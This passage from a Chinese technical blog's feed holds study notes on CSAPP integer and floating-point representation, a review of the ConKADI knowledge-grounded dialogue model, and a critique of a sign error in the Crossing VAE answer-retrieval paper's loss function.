<p>反码（One's Complement），除了最高位的权是<span class="math inline"> \(-(2^{w-1}-1)\)</span>，不是<span class="math inline"> \(-2^{w-1}\)</span>，剩下的跟补码是一样的， <span class="math display">\[
B2O(X)=-x_{w-1}\cdot (2^{w-1}-1)+sum_{i=0}^{w-2}x_i\cdot 2^i
\]</span></p>
<h4 id="原码">原码</h4>
<p>原码（Sign-Magnitude），最高有效位是符号位，用来确定剩下的位应该取负权还是正权：
<span class="math display">\[
B2S(X)=-(-1)^{x_{w-1}}\cdot sum_{i=0}^{w-2}x_i\cdot 2^i
\]</span> 这两种方法都有一个奇怪的属性，对于数字 0 有两种表示，把<span class="math inline"> \([00\cdots 0]\)</span> 解释为 + 0，把<span class="math inline"> \([10\cdots
0]\)</span> 解释为 - 0，虽然过去存在基于反码表示的机器，但几乎所有的现代机器都使用补码。浮点数中有使用原码。</p>
<h3 id="转换">转换</h3>
<p>无符号数和符号数的转换遵循以下规则：</p>
<ul>
<li>保留位特征，即数字的比特串存储不会改变</li>
<li>重新解释，根据比特的权重重新计算</li>
<li>可能会有未期望的效果，例如，加或减<span class="math inline"> \(2^w\)</span>，即转换出现问题</li>
<li>同时包含有符号和无符号数的表达式，有符号数会转换为无符号数
无符号数和有符号数进行比较 / 计算时，会将有符号数隐式转换为无符号数，例如<span class="math inline"> \(-1&gt;0u\)</span>，在使用时要注意。
例如，下面的代码，无符号数<span class="math inline"> \(i\ge
0\)</span> 恒成立，代码会数组越界或者死循环。</li>
</ul>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = cnt<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--) {</span><br><span class="line">    func(a[i]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>另外，<code>sizeof</code> 的返回值也是无符号数。
上面的倒数计数的场景，需要改写成如下形式才能正常工作，它利用了溢出的特性，第一眼看上去会很反直觉。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = cnt<span class="number">-1</span>; i &lt; cnt; i--) {</span><br><span class="line">    func(a[i]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>在 C 语言中，无符号数和有符号数的转换是隐式的，不会有任何的 warning
或者 error。而在 Go
语言中，需要显式对数值进行类型转换，避免了可能的问题。</p>
<h3 id="扩展">扩展</h3>
<p>如何把一个 w 位的数扩展为 w+k 位的数，数值不变？</p>
<h4 id="有符号数-1">有符号数</h4>
<p>做法是，新增的高位复制符号位，剩余位保持不变。 例如 "1100"，扩展增加 1
位，结果是 "11100"。观察可知，<span class="math inline">\(-2^3=-2^4+2^3\)</span>，最高位及更高位的权重和不变，整个结果不变。</p>
<h4 id="无符号数-1">无符号数</h4>
<p>增加 0 即可。</p>
<h3 id="截断">截断</h3>
<p>当一个 w+k 位的数去掉高 k 位时，对</p>
<ul>
<li>无符号数，等价于对<span class="math inline"> \(2^w\)</span> 取模</li>
<li>有符号数，可能正负会发生变化</li>
</ul>
<h2 id="整数运算">整数运算</h2>
<h3 id="加法">加法</h3>
<p>考虑 w 位的两个数 u,v 相加</p>
<h4 id="无符号数-2">无符号数</h4>
<p>等价于两数相加后截断只保留低 w 位（可能会有进位被丢弃） <span class="math display">\[
s=UAdd_w(u,v)=(u+v)mod 2^w
\]</span> 例如两个 4 位数，<span class="math inline">\(13+5=18\ mod\
16=2\)</span></p>
<h4 id="补码加法">补码加法</h4>
<p>有符号的加法在比特特征上与无符号数相同，但是从表现上看，会出现两种情况：</p>
<ul>
<li>正数溢出：两个正数相加，超过<span class="math inline"> \(T_{max}\)</span>，变为负数</li>
<li>负数溢出，两个负数相加，小于<span class="math inline"> \(T_{min}\)</span>，变为正数
减法可以转换为加法求解。</li>
</ul>
<h3 id="乘法">乘法</h3>
<p>两个 w 位数相乘，可能需要至多 2w 位存储结果（考虑不可达的上界，两个
w+1 位的数相乘，最高位为 1，其余位时 0，结果为 2w+1 位）。
同样，需要截断取低 w 位，对无符号数来说，等价于取模。
对于有符号数，经过证明，其乘法与无符号数的乘法位级表示是等价的，同样可能会出现溢出现象。
由于乘法会消耗更多时钟周期（现代计算机需要 3 个），移位只需要 1
个时钟周期，编译器会对乘法进行优化。移位与无符号整数乘比特等价，进而与符号整数相乘等价。</p>
<h3 id="除法">除法</h3>
<p>同样的，除法也可以优化为右移操作，由于整数除法总是舍入到
0，对于补码除法，需要引入偏置位进行修正。</p>
<h2 id="无符号数使用建议">无符号数使用建议</h2>
<p>从前面转换一节讲的例子，可以看到无符号整数的使用可能会引发奇怪的问题。下面是一些使用无符号数的场景</p>
<ul>
<li>加密运算</li>
<li>表示集合，bitmap
需要强调的是，“无符号数适用于非负值的场景” 是一种常见的误区，一个例子就是之前提到的倒排问题。在《Go
程序设计语言》中，作者也建议了一般不要使用无符号数，除非像加密算法这种特殊的场景。</li>
</ul>
<h2 id="大端与小端">大端与小端</h2>
<p>多个字节存储时，根据字节在内存中的地址顺序，有两种存储方式，例如
0x01234567，</p>
<ul>
<li>大端，高位字节在先，01,23,45,67
<ul>
<li>网络传输</li>
</ul></li>
<li>小端，低位字节在先，67,45,23,01
<ul>
<li>x86，ARM 处理器
大端优势是读取直观，但这对计算机来说无关紧要，计算机只需要一个统一的标准进行计算即可。</li>
</ul></li>
</ul>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>体系结构</category>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>体系结构</tag>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP - 学习笔记 (2): 浮点数</title>
    <url>/blog/2023/04/28/CSAPP-Notes-2/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本文介绍了 CSAPP 的第二节，浮点数，介绍了如何用二进制表示小数以及 IEEE 的浮点数标准。</p>
<span id="more"></span>
<h2 id="二进制小数">二进制小数</h2>
<p>使用二进制小数点分割整数和小数部分，小数点左侧为非负幂，右侧为负幂，例如：</p>
<ul>
<li>5 3/4，浮点表示为<span class="math inline"> \(101.11_2\)</span></li>
<li>2 7/8，浮点表示为<span class="math inline"> \(10.111_2\)</span></li>
<li>1 7/16，表示为<span class="math inline"> \(1.0111_2\)</span>
可以观察到</li>
<li>除以 2 等价于右移</li>
<li>乘 2 等价于左移</li>
<li>形如<span class="math inline"> \(0.1111\cdots\)</span> 的数只小于 1.0
<ul>
<li><span class="math inline">\(1/2+1/4+\cdots+1/2^i+\cdots \rightarrow
1.0\)</span></li>
<li> 记作<span class="math inline"> \(1.0-\epsilon\)</span></li>
</ul></li>
</ul>
<h3 id="局限性">局限性</h3>
<ul>
<li>只能精确表示形如<span class="math inline"> \(x/2^k\)</span> 的小数部分（或它们的和）
<ul>
<li>其他有理数存在无限循环，无法精确表示</li>
</ul></li>
<li> w 位数的表示范围受限
<ul>
<li>需要权衡整数范围和小数部分的精度</li>
</ul></li>
</ul>
<h2 id="ieee-浮点数">IEEE 浮点数</h2>
<p>在 1985
年之前，每个计算机厂商有自己的浮点数实现，不同硬件上程序的执行完全无法预测，群魔乱舞。1985
年，IEEE 提出了标准化的浮点数表示，得到了制造商的一致采用。</p>
<h3 id="形式">形式</h3>
<p>使用一种类似科学计数法的形式表示浮点数，形式如下： <span class="math display">\[
(-1)^SM\ 2^E
\]</span></p>
<ul>
<li><span class="math inline">\(S\)</span> 是符号位，决定正负</li>
<li>尾数 <span class="math inline">\(M\in
[1.0,2.0)\)</span> 是二进制小数，记为 frac</li>
<li> 指数 <span class="math inline">\(E\)</span> 表示 2 的指数，记为
exp</li>
</ul>
<h3 id="精度">精度</h3>
<p>IEEE 提供了两种精度的浮点数</p>
<ul>
<li>单精度（32 bits）：1 位 S，8 位 E，23 位 M</li>
<li> 双精度（64 bits）：1 位 S，11 位 E，52 位 M</li>
</ul>
<h3 id="规格化的值">规格化的值</h3>
<p>当 exp 的位模式不全为 1 且不全为 0
时，就属于这种情况，这是最普遍的情况。这种情况下：</p>
<p>指数 exp 被解释为偏置形式的有符号数，即<span class="math inline"> \(E=e-Bias\)</span>，其中<span class="math inline"> \(e\)</span> 是无符号整数，其位表示为<span class="math inline"> \(e_{k-1}\cdots e_1e_0\)</span>，<span class="math inline">\(Bias=2^{k-1}-1\)</span> 是一个偏置值。由此产生的精度范围，单精度是 - 126<sub>+127，双精度是 - 1022</sub>1023。</p>
<ul>
<li>以单精度为例，1 对应 - 126，254 对应 127。注意全 0 和全 1
不属于这种情况。</li>
<li>不使用补码的原因是，<strong>这种偏置表示，可以将整个浮点数看做无符号整数比较大小</strong>。
<ul>
<li>以正数为例，指数大的更大，指数相同尾数大的更大，正好匹配从高到低位逐个比较大小的比较规则。</li>
<li>如果中间的 exp 部分也是有符号的话，就无法这样比较了。</li>
</ul></li>
</ul>
<p>小数字段 frac 被解释描述小数值<span class="math inline"> \(f\in
[0,1)\)</span>，其二进制为<span class="math inline"> \(0.f_{n-1}\cdots
f_1f_0\)</span>，也就是二进制小数点在最高有效位左边。尾数 M 定义为<span class="math inline"> \(M=1+f\)</span>，也就是实际二进制应该为<span class="math inline"> \(1.f_{n-1}\cdots f_1f_0\)</span>，也叫作隐含的 1
开头表示。这是由于总可以调整解码 E，使得<span class="math inline"> \(M\in
[1.0,2.0)\)</span>，那么就无需显式地表示这个 1。</p>
<h3 id="非规格化的值">非规格化的值</h3>
<p>当 exp 的位模式全为 0 时，对应这种情况，这种情况下：</p>
<ul>
<li><span class="math inline">\(E=1-Bias\)</span>
<ul>
<li> 这实现了非规格数到规格数的平滑过渡</li>
</ul></li>
<li><span class="math inline"> \(M=f\)</span>，不包含隐式的 1
这种格式有两个用途：</li>
<li>用于表示 0。规格化的值中，总是有<span class="math inline"> \(M\ge
1\)</span>，不能表示 0。+0.0 的位模式全部为 0：S、frac、exp 均为 0。当 S
为 1，剩余为 0 时，得到 - 0.0。根据 IEEE 的浮点格式，这两种 0
在某些方面不同，在某些方面被认为是相同的。</li>
<li>用于表示非常接近 0.0 的数，它们提供一种属性，被称为逐渐溢出。</li>
</ul>
<h3 id="特殊值">特殊值</h3>
<p>exp 全为 1 时，对应这种情况，这种情况下：</p>
<ul>
<li>若小数域全为
0，根据符号位，分别是正无穷和负无穷，当浮点操作溢出时会出现。</li>
<li>小数域非 0，表示 NaN（Not a Number），即不是一个数，例如<span class="math inline"> \(\sqrt {-1}\)</span> 或者<span class="math inline"> \(\infty-\infty\)</span>。</li>
</ul>
<h3 id="例子">例子</h3>
<p>以 8 位浮点数为例，它的范围如下： 当 exp 全为 0 时，为非规格数</p>
<ul>
<li>frac 全为 0 时，代表 0</li>
<li>frac 不为 0 时，尾数<span class="math inline"> \(M=f\)</span>，没有隐含的 1，<span class="math inline">\(E=1-Bias=-6\)</span>。随着 frac 增大
1，整个数值会增大<span class="math inline"> \(1/512\)</span>。 当 exp
不全为 0 且不全为 1 时，为规格数</li>
<li><span class="math inline"> \(E=e-Bias\)</span>，当<span class="math inline"> \(e=1\)</span> 时，<span class="math inline">\(E=-6\)</span> 与非规格数的指数一致。</li>
<li><span class="math inline">\(M=1+f\)</span>，隐含的
1，使得数值依然连续递增。 当 exp 全为 1 时，为特殊值，例如，无穷 <img src="image-20230427104857216.png"> 以 6 bit（1sign + 3 exp + 2
frac）的 IEEE 浮点数为例，数据分布如下： <img src="image-20230427105829418.png"> 在 0
附近浮点数密集存在，数轴两侧逐渐稀疏。</li>
</ul>
<h3 id="优势">优势</h3>
<ul>
<li>浮点数的 + 0 与整数 0 表示相同</li>
<li>浮点数几乎可以复用无符号整数的比较
<ul>
<li>需要先考虑符号位、-0、NaN 的问题，其他情况可以复用</li>
</ul></li>
</ul>
<h3 id="舍入">舍入</h3>
<p>在浮点数运算时，会先计算出精确值，再适配到给定位中，也就是舍入：</p>
<ul>
<li>如果指数过大，可能会溢出</li>
<li>尾数精度的限制，可能会舍入 IEEE 规定了四种舍入方式：</li>
<li>向 0：1.5-&gt;1，-1.5-&gt;-1</li>
<li> 向<span class="math inline"> \(-\infty\)</span>：1.5-&gt;1，-1.5-&gt;-2</li>
<li> 向<span class="math inline"> \(+\infty\)</span>：1.5-&gt;2，-1.5-&gt;-1</li>
<li> 向最近的偶数：四舍六入五取偶，1.4-&gt;1，1.5-&gt;2，2.5-&gt;2，-1.5-&gt;-2
<ul>
<li>0.5 特殊对待的原因是，统计上看，50% 应该舍，50%
应该入，所以根据奇偶性做不同动作</li>
<li>这是默认的舍入模式
这种舍入方式很容易可以推广到二进制，例如，把下面的二进制数保留 4
个有效位，根据有效位后的余数的大小，决定是舍还是入</li>
</ul></li>
<li>如果余数最高位为 0，代表小于一半，舍</li>
<li>如果余数最高位为 1，其余位为
0，刚好一半，根据有效位最低位决定舍入（0 代表偶数，该舍，1
代表奇数该入）</li>
<li>剩余情况，进位 <img src="image-20230427141836211.png"></li>
</ul>
<h3 id="乘法">乘法</h3>
<p><span class="math inline">\((–1)^{S_1} M_1\  2^{E_1}\ \times\
(–1)^{S_2} M_2\ 2^{E_2}\)</span> 精确结果是<span class="math inline"> \((-1)^SM\ 2^E\)</span>，其中：</p>
<ul>
<li>符号位：<span class="math inline">\(S=S_1 ^{\wedge}
S_2\)</span></li>
<li> 尾数：<span class="math inline">\(M=M_1+M_2\)</span></li>
<li> 指数：<span class="math inline">\(E=E_1+E_2\)</span>
进一步修正：</li>
<li>如果<span class="math inline"> \(M\ge 2\)</span>，右移 1
位，指数 + 1</li>
<li> 如果 E 超出范围，溢出</li>
<li>把 M 舍入到 frac 的精度 除法与之类似。</li>
</ul>
<h3 id="加法">加法</h3>
<p>加减法需要先对齐指数位（对齐二进制小数点），操作后再恢复，也需要考虑修正逻辑，这里略去。</p>
<h3 id="数学性质">数学性质</h3>
<p>由于舍入和溢出的存在，浮点数的运算不满足结合律、分配律，这与整数运算不同。
以结合律为例：</p>
<ul>
<li><span class="math inline">\((2e10+3.14)-2e10=0\)</span></li>
<li><span class="math inline">\(3.14+(2e10-2e10)=3.14\)</span>
这是由于<span class="math inline"> \((2e10+3.14)\)</span> 的时候，尾数根据精度做了舍入，3.14
被省去了。 对于乘法分配律：</li>
<li><span class="math inline">\((1e20*1e20)*1e-20= inf\)</span></li>
<li><span class="math inline">\(1e20*(1e20*1e-20)= 1e20\)</span>
由于无穷的存在，也是不满足的。</li>
</ul>
<h2 id="c-语言中的浮点数">C 语言中的浮点数</h2>
<p>C 语言中，float 和 double 分别对应了 IEEE
的单精度、双精度浮点数。</p>
<h3 id="转换">转换</h3>
<p>浮点数转换时，会更改 bit
表示，这与整数的转换是不同的（只更改解释逻辑）。
当浮点数和整数转换时，会根据尾数 frac
有效位和整数位数，决定是否需要舍入。例如，当 float 转 int 时，frac 23
位可以容纳在 32 位的 int 中，不会舍入。反过来，就需要对低 9
位进行舍入判断了。</p>
<ul>
<li>double/float → int
<ul>
<li>截断小数部分</li>
<li>向 0 舍入</li>
<li>当超出范围或者 NaN 时，未定义，通常设为<span class="math inline"> \(T_{min}\)</span></li>
</ul></li>
<li>int → double
<ul>
<li>double 尾数有 53 位，精准转换，不会有精度丢失</li>
</ul></li>
<li> int → float
<ul>
<li>根据舍入模式对多余位进行处理</li>
</ul></li>
</ul>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>体系结构</category>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>体系结构</tag>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>ConKADI</title>
    <url>/blog/2021/07/20/ConKADI/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>今天来看一篇对话系统的文章，收录于 2020 年的 ACL。这篇文章是常识对话模型（CCM）的后续工作，我之前粗读过一次，还有很多疑惑，今天正好借着这个机会细读一遍。在此之前，先梳理一下对话系统的发展历史。</p>
<span id="more"></span>
<h2 id="对话系统发展简介">对话系统发展简介</h2>
<p>对话系统，即能够与人进行对话的计算机系统，是自然语言处理中的一个重要方向。在前神经网络时期，对话系统主要基于模板生成回复。即使是现在，仍由一些场景下在使用基于模板的回复生成。在 2014 年，seq2seq（Sequence
to
sequence）模型被提出。seq2seq 提供了一种序列间进行转换映射的通用方法。此后，seq2seq 被广泛用于各类序列任务，包含对话系统。但是 seq2seq 应用于对话系统任务时会有以下问题：</p>
<ul>
<li>对同一输入，只能生成单一回复。而理想的对话系统间输入与回复间的关系应该是一对多的。</li>
<li>倾向于生成通用性回复（例如，我不知道）。</li>
</ul>
<p>此后，构建能够生成多样性回复的对话系统一直是研究人员研究的重点。2017 年，zhao 等人将条件变分自编码器（Condition
vae，CVAE）应用于对话生成，通过在隐变量分布中采样不同的隐变量，模型能够生成多样的回复。</p>
<p>另外，有研究指出，对话模型生成通用性回复的原因之一是语料中缺少人类拥有的知识背景，这使得模型无法学习知识进而理解对话。基于此，一部分工作开始探索在对话模型中引入外部知识。2018 年 zhou 等提出的常识对话模型（CCM）就是这类研究的典型代表。</p>
<p>常识对话模型 CCM 虽然比传统模型取得了更好的效果，但是 CCM 在检索知识实体相关知识事实时，没有考虑到实体单词所在的上下文，而复杂实体单词的具体含义往往是由其上下文决定的。这就来到了本文要介绍的 ConKADI。</p>
<p><img src="apple.png"></p>
<h2 id="研究方法">研究方法</h2>
<p>本文提出了：</p>
<ul>
<li>Felicitous Fact
mechanism（恰当事实机制）帮助模型关注在上下文高度相关的知识事实。</li>
<li>上下文知识融合以及灵活模式融合技术，促进知识的集成。</li>
</ul>
<p>ConKADI（Context Knowledge-Aware Diverse and Informative conversation
generation
model），别的不说，这个名字真的跟叠 buff 一样。。。模型的流程如下：</p>
<ol type="1">
<li>恰当事实机制根据知识实体词所在上下文计算得到知识事实的概率分布。（此过程中，使用真实回复作为后验来监督学习）。</li>
<li>上下文融合机制在解码之前将上下文与知识融合。</li>
<li>ConKADI 在灵活融合模式下生成三种类型的单词。</li>
</ol>
<h3 id="模型概览">模型概览</h3>
<p><img src="model.png"></p>
<p>主要由以下几部分组成：</p>
<ul>
<li>知识检索器（Knowledge Retriever）：给定输入<span class="math inline"> \(X\)</span>，对于每一个单词<span class="math inline"> \(x_i\)</span>，检索<span class="math inline"> \(x_i\)</span>​作为头实体或者尾实体的知识事实，若不为实体词，则返回一个空事实。</li>
<li>上下文编码器（Context
Encoder）：使用双向 GRU 进行编码，特殊的是，GRU 的输入加入了当前实体词的嵌入向量。</li>
<li>恰当知识识别器（Felicitous Fact Recognizer）：计算检索事实<span class="math inline"> \(F=\{f_1,f_2,\dots,f_n\}\)</span>​上的概率分布<span class="math inline"> \(z\)</span>，计算过程如下:</li>
</ul>
<p><span class="math display">\[
z_{post}=\eta(\phi(F\cdot
W_{ft})\cdot\phi([{h^x_n}^\intercal;{h^y_m}^\intercal]\cdot
W_{post}))^\intercal
\]</span></p>
<p><span class="math display">\[
z_{prior}=\eta(\phi(F\cdot W_{ft})\cdot\phi({h^x_n}^\intercal\cdot
W_{prior}))^\intercal
\]</span></p>
<p>其中，<span class="math inline">\(\eta\)</span>​​是 softmax 函数，<span class="math inline">\(\phi\)</span>​​是 tanh 激活函数，<span class="math inline">\(F\in
R^{l*(d_e+d_r+d_e)}\)</span>​​是知识事实矩阵，<span class="math inline">\(W_{ft},W_{post},W_{prior}\)</span>​​​​​是训练参数​。直观来看，上下文、知识事实都包含在公式中，但是也不好进一步解释公式的由来，更像是两部分拼凑在一起的。与 VAE 一样，在得到先后验分布后，使用 KL 散度作为损失函数<span class="math inline"> \(\mathcal
L_k\)</span>，达到逼近先后验分布的效果。</p>
<ul>
<li>上下文知识融合：为了增强解码器对知识背景的理解，将输入上下文与知识融合作为解码器的初始权重，即<span class="math inline"> \({h^y_0}^\intercal=tanh([{h^x_n}^\intercal;f_z^\intercal]\cdot
W_{init})\)</span>​</li>
</ul>
<p>此外，为了保证<span class="math inline"> \({h^x_n}^\intercal,f_z^\intercal\)</span> 是有意义的，模型中还引入了词袋损失（参考 CVAE）。为了监督<span class="math inline"> \(z_{post}\)</span>​的概率分布的计算，引入了监督的条件信号（参考 CCM），二者之和为损失函数<span class="math inline"> \(\mathcal L_f\)</span>。​</p>
<h3 id="知识解码器">知识解码器</h3>
<p>解码器同样是 GRU，在解码时，会从以下三种类型的单词中选择进行输出：</p>
<ul>
<li>词表单词</li>
<li>知识实体单词，计算过程如下：</li>
</ul>
<p><span class="math display">\[
z_{d,t}=\eta(\phi(F\cdot
W_{ft})\cdot\phi([{h^y_t}^\intercal;{u_{t-1}}^\intercal]\cdot
W_{d}))^\intercal
\]</span></p>
<p><span class="math display">\[
\gamma_t=sigmoid([{h^y_t}^\intercal;u_t^\intercal;c_t^\intercal]\cdot
W_{gate})\in R^1
\]</span></p>
<p><span class="math display">\[
p_{k,t}=\gamma_t*z+(1.0-\gamma_t)*z_d
\]</span></p>
<p>其中，<span class="math inline">\(c_t\)</span> 是注意力机制的结果，<span class="math inline">\(z_{d,t}\)</span> 也是同样方法计算得到的知识事实的概率分布，与<span class="math inline"> \(z\)</span> 相比，<span class="math inline">\(z_{d,t}\)</span> 是动态的，而<span class="math inline"> \(z\)</span> 是静态的，与 CCM 中的动 / 静态图注意力机制类似。之后，计算得到一个标量<span class="math inline"> \(\gamma_t\)</span> 作为二者的相对比例，求和得到最终的实体单词权重。</p>
<ul>
<li>复制单词。解码器可从输入中复制一个单词作为输出，计算过程如下：</li>
</ul>
<p><span class="math display">\[
p_{c,t}=\eta(\phi(H^x\cdot W_{cs})\cdot\phi({u_t^c}^\intercal\cdot
W_{ct})^\intercal)
\]</span></p>
<p><span class="math display">\[
{u^c_t}^\intercal=[{h^y_t}^\intercal,{u_{t-1}}^\intercal,{c_t}^\intercal]
\]</span></p>
<p>计算形式与前文知识事实概率分布的计算相似。</p>
<h3 id="灵活模式融合">灵活模式融合</h3>
<p>最终输出的概率分布为三种模式的加权和（其中，<span class="math inline">\((\gamma_{w,t},\gamma_{k,t},\gamma_{c,t})\)</span> 是由灵活模式融合计算得出的概率分布，即三者之和为 1。）：
<span class="math display">\[
p_{out,t}=\gamma_{w,t}*p_{w,t}+\gamma_{k,t}*p_{k,t}+\gamma_{c,t}*p_{c,t}
\]</span> 这一部分损失函数为<span class="math inline"> \(\mathcal
L_n\)</span>： <span class="math display">\[
-\sum_t\lambda_tlogp_{out,t}(y_t|y_{t-1:1},X,F)+\frac{\mathcal L_m}{2}
\]</span> 其中，<span class="math inline">\(\mathcal
L_m\)</span> 为解码器输出与真实回复间的交叉熵，<span class="math inline">\(\lambda_t\)</span>​为词表外单词（unk）的惩罚项权重：
<span class="math display">\[
\lambda_t=
\begin{cases}
\frac{1}{\#(unk\in Y)}^3,\ if\ y_t=unk\\
1,\ otherwise
\end{cases}
\]</span> 个人猜测思路是这样，如果<span class="math inline"> \(y_t\)</span> 为 unk，<span class="math inline">\(\lambda_t\)</span>​会更小，进而优化对应参数的速度会减慢。</p>
<h2 id="case-study">Case Study</h2>
<p>下文是论文中展示的回复样例，只看表格生成回复的效果还是不错的。</p>
<p><img src="result.png"></p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>对话系统</category>
      </categories>
      <tags>
        <tag>常识对话</tag>
        <tag>CopyNet</tag>
      </tags>
  </entry>
  <entry>
    <title>有错误论文 - ACL2020：交叉 VAE 用于答案检索</title>
    <url>/blog/2022/03/31/Crossing-VAE/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>最近读了一篇想法有趣、公式有错误、复现不出来的 ACL 论文。发出来分享一下。希望大家也不要迷信 ACL 论文，读论文过程中保持独立思考。</p>
<p>《Crossing Variational Autoencoders for Answer
Retrieval》提出了一种基于交叉 VAE 的答案检索方法，通过交叉 VAE 来对齐答案和问题之间的语义。论文收录于 ACL
2020 中。</p>
<span id="more"></span>
<h2 id="介绍">介绍</h2>
<p>先按照正常的步骤介绍其背景和方法。</p>
<p>答案检索，即从答案候选集合中，选择最匹配问题的答案。解决该问题的一个关键因素在于，如何学习到一个好的问题 / 答案的向量表示。传统的方法使用两个编码器 / 变分自编码器（孪生网络）分别学习二者的向量表征。这种方法过于分离，无法捕捉二者之间的对齐语义。因此，本文提出了交叉变分自编码器，类似 Seq2Seq 的方法，学习二者间的语义对齐。</p>
<p><img src="structure.png"></p>
<p>如上图所示。左一为孪生编码器，分别将答案和问题进行编码，得到向量表征后再判断是否匹配。中间的孪生自编码器也类似，区别在于使用自编码器学习到性质更好的向量表征。但是他们有个共同点：<strong>答案和问题的向量表征是分开编码得到的</strong>。这意味着编码过程中只有单个问题或答案的信息（语义、句法等），而我们关心的是答案和问题是否语义对齐。因此按前一种方法训练得到的向量表征，并不能很好地满足任务的需要。右一为本文提出的孪生交叉 VAE，即在 VAE 的基础上，使用问题和答案的隐变量重构彼此，而非重构自身。从模型结构上，该模型不像 VAE 而更像 Seq2Seq。</p>
<p>举个例子，在问答中，相似的问题的答案可能相去甚远，相似的答案的问题形式可能也差别很大。下图展示了 SQuAD 数据集上的例子，同一个答案与 17 个不同的问题相对齐。只看这些问题的语义，可能差别很大。也就是<span class="math inline"> \(z_q\)</span> 是分开的，而答案却相同，即<span class="math inline"> \(z_q\)</span> 是固定的。这种情况下，希望<span class="math inline"> \(p(y|z_q,z_a)\)</span> 对这些不同的<span class="math inline"> \(z_q\)</span> 都有较好的对齐效果是比较困难的。</p>
<p><img src="SQuAD-example.png"></p>
<p>究其根本，是<strong>同一个答案与不同的问题对齐时，其语义信息侧重点各不相同。</strong>当提问词是 "how
many"是，答案侧重点为"three"，当提问词为"three
cities"时，答案侧重点为"New
Orleans"... 而分开编码得到的向量表征是固定的。要解决这个问题，必须要将答案和问题的编码结合起来。</p>
<p>论文的方法在 MRR 和 R@1 上分别取得了 SOTA，分别提升了 1.46% 和 3.65%。不过对比工作里的 BERT 我怀疑是未做 finetune 的，效果太差了。</p>
<h2 id="方法">方法</h2>
<h3 id="问题定义">问题定义</h3>
<p>问题集合：<span class="math inline">\(q\in \mathcal
Q\)</span>，答案集合：<span class="math inline">\(a\in\mathcal
A\)</span>。对齐关系三元组定义为<span class="math inline"> \((q,a,y)\)</span>，其中<span class="math inline"> \(y\)</span> 为一个二值变量，标识对齐关系。任务定义为，给定一个问题<span class="math inline"> \(q\)</span> 和一组候选答案<span class="math inline"> \(C(q)\subseteq \mathcal
A\)</span>，对每个候选答案<span class="math inline"> \(a\in
C(q)\)</span> 预测<span class="math inline"> \(p(y|q,a)\)</span> 的值。</p>
<h3 id="交叉vae">交叉 VAE</h3>
<p>根据条件分布<span class="math inline"> \(p(q|z_a),p(a|z_q)\)</span> 学习交叉重构，<span class="math inline">\(z_a,z_q\)</span> 为变分自编码器的连续隐变量，交叉重构定义为：
<span class="math display">\[
p(q|a)=\mathbb E_{z_a\sim p(z_a|a)}[p(q|z_a)]\\
p(a|q)=\mathbb E_{z_q\sim p(z_q|q)}[p(a|z_q)]
\]</span> 问答对的匹配，即计算条件分布<span class="math inline"> \(p(y|a,q)\)</span>，等价于 <span class="math display">\[
p(y|a,q)=\mathbb E_{z_q\sim p(z_q|q),z_a\sim p(z_a|a)}[p(y|z_a,z_q)]
\]</span> 目标函数包含三部分：</p>
<p><strong>交叉重构损失</strong>，即两个交叉熵损失之和，公式如下。其中<span class="math inline"> \(E,D\)</span> 分别代表编码器、解码器。 <span class="math display">\[
\mathcal L_{cross}(\theta_E,\theta_D)=y\cdot \mathbb E_{q\sim
Q}[-logp_D(q|a,E(a))]+ y\cdot\mathbb E_{a\sim A}[-logp_D(a|q,E(q))]
\]</span>
<strong>KL 散度损失</strong>，两部分后先验 KL 散度之和，公式如下： <span class="math display">\[
\mathcal L_{KL}(\theta_E)=y\cdot \mathbb E_{q\sim
Q}[D_{KL}((p(z_q|q)||p(z_q))]+ y\cdot \mathbb E_{a\sim
A}[D_{KL}((p(z_a|a)||p(z_a))]
\]</span>
<strong> 问答匹配损失</strong>，最后输出的匹配结果的交叉熵损失，公式如下。其中，<span class="math inline">\(f\)</span> 为匹配函数。 <span class="math display">\[
\mathcal L_{matching}(\phi_f)=-[y\cdot
logp_{f_\phi}p(y|z_q,z_a)+(1-y)\cdot logp_{f_\phi}(1-p(y|z_q,z_a))]
\]</span>
最后，将三个损失相加，即得到了最终的目标函数，并引入超参数控制权重：
<span class="math display">\[
\mathcal J=-\alpha \mathcal L_{cross}-\beta\mathcal
L_{KL}+\gamma\mathcal L_{matching}
\]</span></p>
<h2 id="问题">问题</h2>
<p>细心的读者可能会发现了，你是要<strong>最小化匹配损失，最后的<span class="math inline"> \(\mathcal
J\)</span> 应该也是要最小化的。那不就变成最大化 KL 和重构损失了吗？</strong>对，这就是问题所在。论文中提到是要最大化 ELBO 和最小化匹配损失，得到了最后的<span class="math inline"> \(\mathcal J\)</span>。然而事实上，<span class="math inline">\(\mathcal L_{crosss}+\mathcal
L_{KL}=-ELBO\)</span>，最小化<span class="math inline"> \(\mathcal
L_{crosss}+\mathcal
L_{KL}\)</span> 才是在最大化 ELBO。论文作者根本没有分清楚 VAE 的 ELBO 和损失，最后闹出了这种笑话。加之论文中有将 objective 和 loss 混用且使用错误的情况。也侧面印证了这一事实。正确的损失函数应该形如：
<span class="math display">\[
\mathcal J=\alpha \mathcal L_{cross}+\beta\mathcal L_{KL}+\gamma\mathcal
L_{matching}
\]</span>
复现性上，我问了实验室的一个师兄，说是论文的结果是复现不出来的，论文也没有公开代码。再加上我本人看到这篇论文第一感觉的强烈违和感，将 VAE 改为 Seq2Seq 的形式，整个 VAE 的公式可能都要重新推导，只改最后的 ELBO 如何保证过程正确？CVAE 可能才是更自然的想法。</p>
